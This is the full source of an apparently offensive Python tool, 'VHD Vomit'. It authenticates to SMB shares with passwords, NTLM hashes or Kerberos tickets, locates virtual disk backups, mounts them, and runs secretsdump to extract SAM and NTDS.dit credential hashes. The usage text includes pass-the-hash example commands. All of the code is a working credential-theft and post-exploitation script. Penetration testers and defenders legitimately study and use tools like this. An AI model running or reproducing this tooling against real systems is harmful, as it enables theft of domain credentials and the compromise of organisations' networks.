#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import getpass
import os
import subprocess
import sys
import tempfile
import time
import threading
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

BANNER = r"""
 ██▒   █▓ ██░ ██ ▓█████▄     ██▒   █▓ ▒█████   ███▄ ▄███▓ ██▓▄▄▄█████▓
▓██░   █▒▓██░ ██▒▒██▀ ██▌   ▓██░   █▒▒██▒  ██▒▓██▒▀█▀ ██▒▓██▒▓  ██▒ ▓▒
 ▓██  █▒░▒██▀▀██░░██   █▌    ▓██  █▒░▒██░  ██▒▓██    ▓██░▒██▒▒ ▓██░ ▒░
  ▒██ █░░░▓█ ░██ ░▓█▄   ▌     ▒██ █░░▒██   ██░▒██    ▒██ ░██░░ ▓██▓ ░
   ▒▀█░  ░▓█▒░██▓░▒████▓       ▒▀█░  ░ ████▓▒░▒██▒   ░██▒░██░  ▒██▒ ░
   ░ ▐░   ▒ ░░▒░▒ ▒▒▓  ▒       ░ ▐░  ░ ▒░▒░▒░ ░ ▒░   ░  ░░▓    ▒ ░░
   ░ ░░   ▒ ░▒░ ░ ░ ▒  ▒       ░ ░░    ░ ▒ ▒░ ░  ░      ░ ▒ ░    ░
     ░░   ░  ░░ ░ ░ ░  ░         ░░  ░ ░ ░ ▒  ░      ░    ▒ ░  ░
      ░   ░  ░  ░   ░             ░      ░ ░         ░    ░
     ░            ░              ░
        Mount SMB shares, extract VHD/VHDX/VMDK backups, dump credentials
"""

_print_lock = threading.Lock()


def tprint(*args, **kwargs):
    with _print_lock:
        print(*args, **kwargs)


def die(msg, code=1):
    print(f"[!] {msg}")
    sys.exit(code)


def ensure_root():
    if os.geteuid() != 0:
        die("Must run as root (use sudo)")


def check_deps(local_mode=False):
    from shutil import which
    missing = []

    if not local_mode:
        if not Path("/sbin/mount.cifs").exists() and not which("mount.cifs"):
            missing.append("cifs-utils")
    if not which("qemu-nbd"):
        missing.append("qemu-utils")
    if not (which("ntfs-3g") or which("mount.ntfs")):
        missing.append("ntfs-3g")

    if missing:
        die(f"Missing dependencies: {', '.join(missing)}")


def decode_smb_field(val):
    if isinstance(val, bytes):
        for enc in ("utf-16le", "utf-8", "latin1"):
            try:
                return val.decode(enc).strip('\x00').strip()
            except:
                continue
        return ""
    return str(val).strip('\x00').strip()


def parse_hashes(hashes_str):
    """Parse LMHASH:NTHASH or :NTHASH into (lmhash, nthash)."""
    lmhash = nthash = ''
    if hashes_str:
        parts = hashes_str.split(':', 1)
        lmhash = parts[0]
        nthash = parts[1] if len(parts) > 1 else ''
    return lmhash, nthash


# ---------------------------------------------------------------------------
# Impacket FUSE filesystem — mounts SMB shares using impacket for auth so
# NTLM hashes and Kerberos tickets work without touching mount.cifs (which
# always MD4-hashes whatever password string you give it).
# ---------------------------------------------------------------------------

class _ImpacketFUSE:
    """
    Read-only FUSE backend backed by two impacket SMBConnections:
      _list_conn  — directory listing  (listPath manages its own TIDs)
      _io_conn    — file I/O           (openFile/readFile with a held TID)
    Two connections avoid a TID conflict: listPath disconnects the tree after
    each call, which would revoke our openFile handles if we shared one conn.
    """

    def __init__(self, host, share, user, password, domain,
                 lmhash, nthash, kerberos, aes_key, kdc_host):
        self.share = share
        self._list_lock = threading.Lock()
        self._io_lock   = threading.Lock()
        self._open_fids = {}   # fuse_path -> smb_fid

        args = (host, user, password, domain, lmhash, nthash, kerberos, aes_key, kdc_host)
        self._list_conn = self._connect(*args)
        self._io_conn   = self._connect(*args)
        self._tid = self._io_conn.connectTree(share)

    @staticmethod
    def _connect(host, user, password, domain, lmhash, nthash,
                 kerberos, aes_key, kdc_host):
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(host, host, sess_port=445)
        if kerberos:
            conn.kerberosLogin(user, password, domain, lmhash, nthash,
                               aes_key, kdcHost=kdc_host or host)
        else:
            conn.login(user, password, domain, lmhash, nthash)
        return conn

    def _smb_path(self, fuse_path):
        p = fuse_path.replace('/', '\\')
        return p or '\\'

    def getattr(self, path):
        import errno
        import fuse
        import stat as _stat

        st = fuse.Stat()
        st.st_uid = st.st_gid = 0
        st.st_atime = st.st_mtime = st.st_ctime = 0

        if path == '/':
            st.st_mode = _stat.S_IFDIR | 0o755
            st.st_nlink = 2
            st.st_size = 0
            return st

        parent, name = path.rsplit('/', 1)
        smb_parent = self._smb_path(parent or '/')
        search = smb_parent.rstrip('\\') + '\\' + name

        with self._list_lock:
            try:
                entries = self._list_conn.listPath(self.share, search)
                for e in entries:
                    ename = e.get_longname()
                    if ename in ('.', '..'):
                        continue
                    if ename.lower() == name.lower():
                        if e.is_directory():
                            st.st_mode = _stat.S_IFDIR | 0o755
                            st.st_nlink = 2
                            st.st_size = 0
                        else:
                            st.st_mode = _stat.S_IFREG | 0o444
                            st.st_nlink = 1
                            st.st_size = e.get_filesize()
                        return st
            except Exception:
                pass
        return -errno.ENOENT

    def readdir(self, path, offset):
        import fuse
        smb_path = self._smb_path(path)
        search = smb_path.rstrip('\\') + '\\*'
        yield fuse.Direntry('.')
        yield fuse.Direntry('..')
        with self._list_lock:
            try:
                entries = self._list_conn.listPath(self.share, search)
                for e in entries:
                    name = e.get_longname()
                    if name not in ('.', '..'):
                        d = fuse.Direntry(name)
                        d.type = 4 if e.is_directory() else 8  # DT_DIR / DT_REG
                        yield d
            except Exception as ex:
                tprint(f"  [!] readdir {path}: {ex}")

    def open(self, path, flags):
        import errno
        smb_path = self._smb_path(path)
        with self._io_lock:
            try:
                fid = self._io_conn.openFile(
                    self._tid, smb_path,
                    desiredAccess=0x80000000,  # GENERIC_READ
                    shareMode=0x00000007,      # share R/W/D
                )
                self._open_fids[path] = fid
                return 0
            except Exception as ex:
                tprint(f"  [!] open {path}: {ex}")
                return -errno.EIO

    def read(self, path, size, offset):
        import errno
        fid = self._open_fids.get(path)
        if fid is None:
            return -errno.EBADF
        with self._io_lock:
            try:
                return self._io_conn.readFile(self._tid, fid,
                                              offset=offset,
                                              bytesToRead=size,
                                              singleCall=False)
            except Exception as ex:
                tprint(f"  [!] read {path}@{offset}: {ex}")
                return -errno.EIO

    def release(self, path, flags):
        with self._io_lock:
            fid = self._open_fids.pop(path, None)
            if fid is not None:
                try:
                    self._io_conn.closeFile(self._tid, fid)
                except Exception:
                    pass
        return 0

    def teardown(self):
        for conn in (self._list_conn, self._io_conn):
            try:
                conn.logoff()
            except Exception:
                pass


def mount_impacket_fuse(host, share, user, password, domain,
                        lmhash, nthash, kerberos, aes_key, kdc_host):
    """
    Mount an SMB share as a read-only FUSE filesystem via impacket.
    Supports NTLM hash and Kerberos auth — bypasses mount.cifs entirely.
    Returns (mount_path, backend_obj).
    """
    try:
        import fuse
        fuse.fuse_python_api = (0, 2)
    except ImportError:
        die("python3-fuse not found — install: apt install python3-fuse")

    mnt = f"/mnt/smb_{share}"
    Path(mnt).mkdir(parents=True, exist_ok=True)
    if is_mounted(mnt):
        force_umount(mnt)

    backend = _ImpacketFUSE(host, share, user, password, domain,
                             lmhash, nthash, kerberos, aes_key, kdc_host)

    class _FW(fuse.Fuse):
        def getattr(self, path):             return backend.getattr(path)
        def readdir(self, path, offset):     return backend.readdir(path, offset)
        def open(self, path, flags):         return backend.open(path, flags)
        def read(self, path, size, offset):  return backend.read(path, size, offset)
        def release(self, path, flags):      return backend.release(path, flags)

    server = _FW(version="%prog", usage="", dash_s_do='setsingle')
    server.parse(['-o', 'ro,direct_io,nonempty', mnt], errex=1)

    t = threading.Thread(target=server.main, daemon=True)
    t.start()

    for _ in range(20):
        if is_mounted(mnt):
            print(f"[+] Impacket FUSE mounted {share} at {mnt}")
            return mnt, backend
        time.sleep(0.5)

    die(f"Impacket FUSE mount timed out for //{host}/{share}")


def list_smb_shares(host, user, password, domain, lmhash='', nthash='',
                    kerberos=False, aes_key='', kdc_host=''):
    try:
        from impacket.smbconnection import SMBConnection
    except ImportError as e:
        die(f"Impacket not available: {e}\nInstall: sudo python3 -m pip install impacket")

    try:
        conn = SMBConnection(host, host, sess_port=445)
        if kerberos:
            conn.kerberosLogin(user, password, domain, lmhash, nthash,
                               aes_key, kdcHost=kdc_host or host)
        else:
            conn.login(user, password, domain, lmhash, nthash)

        shares = conn.listShares()

        result = []
        for share in shares:
            try:
                name = decode_smb_field(share['shi1_netname'])
            except:
                try:
                    name = decode_smb_field(share.get('shi1_netname', ''))
                except:
                    continue

            if not name:
                continue
            if name.upper() in ('IPC$', 'ADMIN$'):
                continue

            try:
                remark = decode_smb_field(share.get('shi1_remark', ''))
            except:
                remark = ""

            result.append((name, remark))

        conn.logoff()
        return result
    except Exception as e:
        die(f"SMB connection failed: {e}")


def select_shares(shares):
    print("\n[*] Available shares:")
    for i, (name, remark) in enumerate(shares, 1):
        desc = f" — {remark}" if remark else ""
        print(f"  [{i}] {name}{desc}")
    print("  [a] All shares")

    while True:
        choice = input("\n[?] Select shares (1,2,3 or 'a'): ").strip().lower()
        if choice in ('a', 'all'):
            return [s[0] for s in shares]

        try:
            indices = [int(x.strip()) for x in choice.split(',')]
            selected = [shares[i-1][0] for i in indices if 1 <= i <= len(shares)]
            if selected:
                return selected
        except:
            pass

        print("[!] Invalid selection")


def create_cifs_creds(domain, user, password):
    fd, path = tempfile.mkstemp(prefix="cifs_", suffix=".creds")
    os.close(fd)

    with open(path, 'w') as f:
        if domain:
            f.write(f"domain={domain}\n")
        if user:
            f.write(f"username={user}\n")
        if password:
            f.write(f"password={password}\n")

    os.chmod(path, 0o600)
    return path


def is_mounted(path):
    try:
        with open('/proc/mounts') as f:
            return any(line.split()[1] == path for line in f)
    except:
        return False


def force_umount(path):
    subprocess.run(['umount', path], capture_output=True)
    subprocess.run(['umount', '-l', path], capture_output=True)


def mount_cifs_share(host, share, creds_file):
    mnt = Path('/mnt') / share
    mnt.mkdir(parents=True, exist_ok=True)

    if is_mounted(str(mnt)):
        choice = input(f"[?] {mnt} already mounted. [r]euse/[u]nmount/[s]kip? ").lower()
        if choice == 'r':
            return str(mnt)
        elif choice == 'u':
            force_umount(str(mnt))
        else:
            return None

    unc = f"//{host}/{share}"
    opts = f"credentials={creds_file},vers=3.0,iocharset=utf8"
    cmd = ['mount', '-t', 'cifs', unc, str(mnt), '-o', opts]

    try:
        subprocess.run(cmd, check=True, capture_output=True)
        print(f"[+] Mounted {share} at {mnt}")
        return str(mnt)
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to mount {share}: {e.stderr.decode()}")
        return None


def get_file_size_gb(path):
    try:
        size_bytes = Path(path).stat().st_size
        return f"{size_bytes / (1024**3):.2f}GB"
    except:
        return "??GB"


def scan_directory_for_vhdx(directory):
    """Scan a directory tree for VHD/VHDX/VMDK files using os.scandir."""
    found = []
    stack = [str(directory)]

    while stack:
        current = stack.pop()
        try:
            with os.scandir(current) as it:
                for entry in it:
                    try:
                        if entry.is_dir(follow_symlinks=False):
                            stack.append(entry.path)
                        elif entry.is_file(follow_symlinks=False):
                            if entry.name.lower().endswith(('.vhdx', '.vhd', '.vmdk')):
                                size = get_file_size_gb(entry.path)
                                found.append(entry.path)
                                tprint(f"    [+] FOUND: {entry.name} ({size})")
                    except (PermissionError, OSError):
                        continue
        except (PermissionError, OSError) as e:
            tprint(f"  [!] Cannot read {current}: {e}")

    return found


def find_vhdx_files(paths, max_workers=10):
    """
    Find all virtual disk files under the given paths.

    Expands each root one level before parallelizing so that a single
    mounted share still produces many concurrent scan tasks.
    """
    print(f"[*] Scanning for VHD/VHDX/VMDK files...")

    tasks = []
    # Files found during the expansion scan (at root level)
    early_hits = []

    for path in paths:
        p = Path(path)
        if not p.exists():
            print(f"[!] Path does not exist, skipping: {path}")
            continue

        subdirs = []
        try:
            with os.scandir(p) as it:
                for entry in it:
                    if entry.is_dir(follow_symlinks=False):
                        subdirs.append(Path(entry.path))
                    elif entry.is_file(follow_symlinks=False):
                        if entry.name.lower().endswith(('.vhd', '.vhdx', '.vmdk')):
                            size = get_file_size_gb(entry.path)
                            early_hits.append(entry.path)
                            print(f"    [+] FOUND: {entry.name} ({size})")
        except (PermissionError, OSError) as e:
            print(f"[!] Cannot read {p}: {e}")

        if subdirs:
            tasks.extend(subdirs)
        # else: flat dir — early_hits already captured all files, no task needed

    vhdx_files = list(early_hits)

    if tasks:
        print(f"[*] Dispatching {len(tasks)} scan task(s) across up to {max_workers} thread(s)...")
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(scan_directory_for_vhdx, d): d for d in tasks}

            for future in as_completed(futures):
                try:
                    vhdx_files.extend(future.result())
                except Exception as e:
                    tprint(f"[!] Thread error: {e}")

    print(f"[*] Scan complete. Found {len(vhdx_files)} virtual disk file(s) total")
    return vhdx_files


def select_vhdx(vhdx_list):
    if not vhdx_list:
        return []

    print("\n[*] Virtual disk files found:")
    for i, vhdx in enumerate(vhdx_list, 1):
        size = get_file_size_gb(vhdx)
        name = Path(vhdx).name
        note = " [raw backing file — skip]" if "-flat." in name.lower() else ""
        print(f"  [{i}] {name} ({size}){note}")
    print("  [a] All")
    print("  [n] None")

    while True:
        choice = input("\n[?] Select files (1,2,3 or 'a'/'n'): ").lower()
        if choice in ('n', 'none'):
            return []
        if choice in ('a', 'all'):
            return vhdx_list

        try:
            indices = [int(x.strip()) for x in choice.split(',')]
            selected = [vhdx_list[i-1] for i in indices if 1 <= i <= len(vhdx_list)]
            if selected:
                return selected
        except:
            pass

        print("[!] Invalid selection")


def get_fs_type(device):
    try:
        result = subprocess.run(
            ['blkid', '-s', 'TYPE', '-o', 'value', device],
            capture_output=True,
            text=True
        )
        return result.stdout.strip().lower()
    except:
        return ""


def load_nbd_module():
    subprocess.run(['modprobe', 'nbd', 'max_part=16'], capture_output=True)


def find_free_nbd():
    for i in range(16):
        dev = f"/dev/nbd{i}"
        if not Path(dev).exists():
            continue

        pid_file = Path(f"/sys/block/nbd{i}/pid")
        if not pid_file.exists():
            return dev

    return None


def mount_vhdx_image(vhdx_path):
    vhdx_name = Path(vhdx_path).stem
    ext = Path(vhdx_path).suffix.lower()

    fmt = {'vmdk': 'vmdk', '.vhd': 'vhd'}.get(ext, 'vhdx')

    print(f"[*] Processing: {Path(vhdx_path).name}")

    load_nbd_module()
    nbd_dev = find_free_nbd()

    if not nbd_dev:
        print("[!] No free NBD device")
        return None, []

    try:
        r = subprocess.run(
            ['qemu-nbd', '--connect', nbd_dev, f'--format={fmt}', '--read-only', vhdx_path],
            capture_output=True
        )
        if r.returncode != 0:
            err = r.stderr.decode(errors='replace').strip()
            print(f"[!] qemu-nbd failed: {err or '(no output)'}")
            subprocess.run(['qemu-nbd', '--disconnect', nbd_dev], capture_output=True)
            return None, []
        print(f"[+] Connected {nbd_dev}")

        time.sleep(3)
        subprocess.run(['partprobe', nbd_dev], capture_output=True)
        time.sleep(2)

        mounted = []
        partitions = sorted(Path('/dev').glob(f"{Path(nbd_dev).name}p*"))

        if not partitions:
            partitions = [Path(nbd_dev)]

        for part in partitions:
            fs = get_fs_type(str(part))

            if fs and 'ntfs' in fs:
                mnt = tempfile.mkdtemp(prefix=f"vhdx_{vhdx_name}_")

                try:
                    result = subprocess.run(
                        ['ntfs-3g', '-o', 'ro', str(part), mnt],
                        capture_output=True
                    )

                    if result.returncode == 0:
                        mounted.append((str(part), mnt))
                        print(f"[+] Mounted {part}")
                    else:
                        os.rmdir(mnt)
                except Exception:
                    try:
                        os.rmdir(mnt)
                    except:
                        pass
            else:
                mnt = tempfile.mkdtemp(prefix=f"vhdx_{vhdx_name}_")

                try:
                    result = subprocess.run(
                        ['ntfs-3g', '-o', 'ro,force', str(part), mnt],
                        capture_output=True
                    )

                    if result.returncode == 0 and list(Path(mnt).iterdir()):
                        mounted.append((str(part), mnt))
                        print(f"[+] Mounted {part}")
                    else:
                        subprocess.run(['umount', mnt], capture_output=True)
                        os.rmdir(mnt)
                except:
                    try:
                        os.rmdir(mnt)
                    except:
                        pass

        if not mounted:
            subprocess.run(['qemu-nbd', '--disconnect', nbd_dev], capture_output=True)
            print("[!] No mountable filesystems")
            return None, []

        return nbd_dev, mounted

    except Exception as e:
        subprocess.run(['qemu-nbd', '--disconnect', nbd_dev], capture_output=True)
        print(f"[!] Mount failed ({Path(vhdx_path).name}): {e}")
        return None, []


def cleanup_vhdx(nbd_dev, mounts):
    for part, mnt in mounts:
        subprocess.run(['umount', mnt], capture_output=True)
        subprocess.run(['umount', '-l', mnt], capture_output=True)
        try:
            os.rmdir(mnt)
        except:
            pass

    if nbd_dev:
        subprocess.run(['qemu-nbd', '--disconnect', nbd_dev], capture_output=True)


def run_secretsdump(args, outfile):
    from shutil import which

    secretsdump_path = which('secretsdump.py')

    if not secretsdump_path:
        user_home = os.path.expanduser('~')
        sudo_user = os.environ.get('SUDO_USER')

        possible_paths = [
            f'/home/{sudo_user}/.local/bin/secretsdump.py' if sudo_user else None,
            f'{user_home}/.local/bin/secretsdump.py',
            '/usr/local/bin/secretsdump.py',
        ]

        for path in possible_paths:
            if path and Path(path).exists():
                secretsdump_path = path
                break

    if not secretsdump_path:
        print("[!] secretsdump.py not found")
        return

    cmd = [secretsdump_path] + args

    print(f"[*] Running secretsdump -> {outfile}")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)

        print(result.stdout)

        with open(outfile, 'w') as f:
            f.write(result.stdout)

        if result.stderr:
            print(f"[!] Errors: {result.stderr}")

        if Path(outfile).stat().st_size > 0:
            print(f"[+] Output saved to {outfile}")
        else:
            print(f"[!] Dump failed (empty output)")
    except Exception as e:
        print(f"[!] Exception: {e}")


def _copy_hives(tmp_dir, *hive_paths):
    """Copy registry hive files to a writable temp dir; return list of copied paths."""
    import shutil
    copies = []
    for src in hive_paths:
        if src is None:
            copies.append(None)
            continue
        dst = os.path.join(tmp_dir, Path(src).name)
        shutil.copy2(str(src), dst)
        copies.append(dst)
    return copies


def _dump_dc(hostname, ntds, system, security):
    with tempfile.TemporaryDirectory(prefix="vhdvomit_hives_") as tmp:
        ntds_c, sys_c, sec_c = _copy_hives(tmp, ntds, system, security)
        args = ['-ntds', ntds_c, '-system', sys_c, 'LOCAL']
        run_secretsdump(args, f"{hostname}_secretsdump.txt")


def _dump_sam(hostname, sam, system, security):
    with tempfile.TemporaryDirectory(prefix="vhdvomit_hives_") as tmp:
        sam_c, sys_c, sec_c = _copy_hives(tmp, sam, system, security)
        args = ['-sam', sam_c, '-system', sys_c]
        if sec_c:
            args.extend(['-security', sec_c])
        args.append('LOCAL')
        run_secretsdump(args, f"{hostname}_secretsdump.txt")


def extract_credentials(vhdx_path):
    hostname = Path(vhdx_path).stem

    nbd_dev, mounts = mount_vhdx_image(vhdx_path)
    if not nbd_dev:
        return

    try:
        for part, mnt in mounts:
            root = Path(mnt)

            config_paths = [
                root / 'Windows' / 'System32' / 'config',
                root / 'WINDOWS' / 'System32' / 'config',
                root / 'windows' / 'system32' / 'config'
            ]

            config = None
            for cp in config_paths:
                if cp.exists():
                    config = cp
                    break

            if not config:
                continue

            sam = config / 'SAM'
            system = config / 'SYSTEM'
            security = config / 'SECURITY'

            ntds_paths = [
                root / 'Windows' / 'NTDS' / 'ntds.dit',
                root / 'WINDOWS' / 'NTDS' / 'ntds.dit',
                root / 'windows' / 'ntds' / 'ntds.dit'
            ]

            ntds = None
            for np in ntds_paths:
                if np.exists():
                    ntds = np
                    break

            if ntds and system.exists():
                print(f"[+] Domain Controller backup detected")
                _dump_dc(hostname, ntds, system, security if security.exists() else None)

            if sam.exists() and system.exists():
                print(f"[+] SAM database found")
                _dump_sam(hostname, sam, system, security if security.exists() else None)

    finally:
        cleanup_vhdx(nbd_dev, mounts)


def run_smb_mode(args):
    host = args.target
    user = args.username
    password = args.password
    domain = args.domain
    specific_path = args.path
    kerberos = args.kerberos
    aes_key = args.aesKey or ''
    kdc_host = args.dc_ip or ''

    lmhash, nthash = parse_hashes(args.hashes)

    # Only prompt for password when using cleartext auth
    use_fuse = kerberos or bool(nthash)
    if not use_fuse and user and not password and not getattr(args, 'no_pass', False):
        password = getpass.getpass("[?] Password: ")

    domain_prefix = f"{domain}\\" if domain else ""
    if kerberos:
        auth_desc = f"Kerberos as {domain_prefix}{user}"
    elif nthash:
        auth_desc = f"NTLM hash as {domain_prefix}{user}"
    elif user:
        auth_desc = f"{domain_prefix}{user}"
    else:
        auth_desc = "null authentication"

    print(f"[*] Connecting to {host} ({auth_desc})...")

    shares = list_smb_shares(host, user, password, domain,
                              lmhash=lmhash, nthash=nthash,
                              kerberos=kerberos, aes_key=aes_key, kdc_host=kdc_host)

    if not shares:
        die("No accessible shares found")

    if specific_path:
        parts = specific_path.replace('\\', '/').split('/', 1)
        share_name_raw = parts[0]
        share_name = share_name_raw.replace('$', '')
        subpath = parts[1] if len(parts) > 1 else ''

        share_with_dollar = share_name + '$'
        available_share_names = [s[0] for s in shares]

        if share_with_dollar not in available_share_names and share_name not in available_share_names:
            die(f"Specified share '{share_name}' not found in available shares")

        selected = [share_with_dollar if share_with_dollar in available_share_names else share_name]
        print(f"[*] Using specified path: {share_name}\\{subpath}")
    else:
        selected = select_shares(shares)

    if use_fuse:
        print("[*] Using impacket FUSE (hash/Kerberos auth — bypasses mount.cifs)")
    creds = None if use_fuse else create_cifs_creds(domain, user, password)

    mounted_shares = []   # all mount points (strings)
    fuse_mounts = []      # (mnt, backend) pairs for FUSE teardown

    try:
        for share in selected:
            if use_fuse:
                mnt, backend = mount_impacket_fuse(
                    host, share, user, password, domain,
                    lmhash, nthash, kerberos, aes_key, kdc_host)
                mounted_shares.append(mnt)
                fuse_mounts.append((mnt, backend))
            else:
                mnt = mount_cifs_share(host, share, creds)
                if mnt:
                    mounted_shares.append(mnt)

        if not mounted_shares:
            die("No shares mounted successfully")

        if specific_path:
            parts = specific_path.replace('\\', '/').split('/', 1)
            if len(parts) > 1:
                subpath = parts[1]
                scan_paths = [str(Path(mounted_shares[0]) / subpath)]
            else:
                scan_paths = mounted_shares
        else:
            scan_paths = mounted_shares

        vhdx_files = find_vhdx_files(scan_paths, max_workers=args.workers)

        if not vhdx_files:
            print("[!] No VHD/VHDX/VMDK files found")
            return

        selected_vhdx = select_vhdx(vhdx_files)

        for vhdx in selected_vhdx:
            extract_credentials(vhdx)

        print("\n[+] Complete")

    finally:
        print("[*] Cleaning up...")
        fuse_mnt_set = {m for m, _ in fuse_mounts}

        for mnt, backend in fuse_mounts:
            subprocess.run(['fusermount', '-u', mnt], capture_output=True)
            time.sleep(0.3)
            if is_mounted(mnt):
                force_umount(mnt)
            backend.teardown()
            print(f"[+] Unmounted {mnt}")

        for mnt in mounted_shares:
            if mnt not in fuse_mnt_set and is_mounted(mnt):
                force_umount(mnt)
                print(f"[+] Unmounted {mnt}")

        if creds:
            try:
                os.remove(creds)
            except:
                pass


def run_local_mode(args):
    local_paths = args.local_path

    valid_paths = []
    for p in local_paths:
        path = Path(p)
        if not path.exists():
            print(f"[!] Path does not exist: {p}")
        elif not path.is_dir():
            print(f"[!] Not a directory: {p}")
        else:
            valid_paths.append(str(path.resolve()))

    if not valid_paths:
        die("No valid local paths to scan")

    print(f"[*] Local mode — scanning {len(valid_paths)} path(s):")
    for p in valid_paths:
        print(f"    {p}")

    vhdx_files = find_vhdx_files(valid_paths, max_workers=args.workers)

    if not vhdx_files:
        print("[!] No VHD/VHDX/VMDK files found")
        return

    selected_vhdx = select_vhdx(vhdx_files)

    for vhdx in selected_vhdx:
        extract_credentials(vhdx)

    print("\n[+] Complete")


def main():
    print(BANNER)

    ensure_root()

    parser = argparse.ArgumentParser(
        description='Mount SMB shares or scan local paths for VHD/VHDX/VMDK backups and extract credentials',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  SMB — null auth:
    %(prog)s -t 192.168.1.10

  SMB — password auth:
    %(prog)s -t 192.168.1.10 -u administrator -p Password123 -d CORP

  SMB — pass-the-hash (NTLM):
    %(prog)s -t 192.168.1.10 -u administrator -d CORP -hashes :a87f3a337d73085c45f9416be5787d86

  SMB — Kerberos (uses KRB5CCNAME ticket cache):
    %(prog)s -t dc01.corp.local -u administrator -d CORP -k

  SMB — specific share path:
    %(prog)s -t 192.168.1.10 -u admin -p pass --path "D$/Backups/VMs"

  Local — NFS/CIFS already mounted, scan single dir:
    %(prog)s --local-path /mnt/nfs/backups

  Local — scan multiple paths:
    %(prog)s --local-path /mnt/nfs/backups /mnt/usb/vmstore

  Local — more parallel threads for large shares:
    %(prog)s --local-path /mnt/nfs/backups --workers 20
        '''
    )

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument('-t', '--target', help='Target host IP or hostname (SMB mode)')
    mode.add_argument('--local-path', nargs='+', metavar='PATH',
                      help='One or more local directory paths to scan (local mode, skips SMB)')

    parser.add_argument('-u', '--username', default='', help='Username (SMB mode, default: null auth)')
    parser.add_argument('-p', '--password', default='', help='Password (SMB mode)')
    parser.add_argument('-d', '--domain', default='', help='Domain name (SMB mode)')
    parser.add_argument('-hashes', metavar='LMHASH:NTHASH', default='',
                        help='NTLM hashes for authentication, format: LMHASH:NTHASH or :NTHASH')
    parser.add_argument('-no-pass', action='store_true', dest='no_pass',
                        help='Skip password prompt (use with -k or -hashes)')
    parser.add_argument('-k', '--kerberos', action='store_true',
                        help='Use Kerberos authentication (reads TGT from KRB5CCNAME)')
    parser.add_argument('-aesKey', metavar='hex key', default='',
                        help='AES key for Kerberos authentication (128 or 256 bits)')
    parser.add_argument('-dc-ip', metavar='ip address', default='', dest='dc_ip',
                        help='IP address of the domain controller (Kerberos KDC)')
    parser.add_argument('--path', default='', help='Specific share path to scan, e.g. "D$/Backups/VMs" (SMB mode)')
    parser.add_argument('--workers', type=int, default=10,
                        help='Parallel scan threads (default: 10)')

    args = parser.parse_args()

    local_mode = args.local_path is not None
    check_deps(local_mode=local_mode)

    if local_mode:
        run_local_mode(args)
    else:
        run_smb_mode(args)


if __name__ == '__main__':
    main()
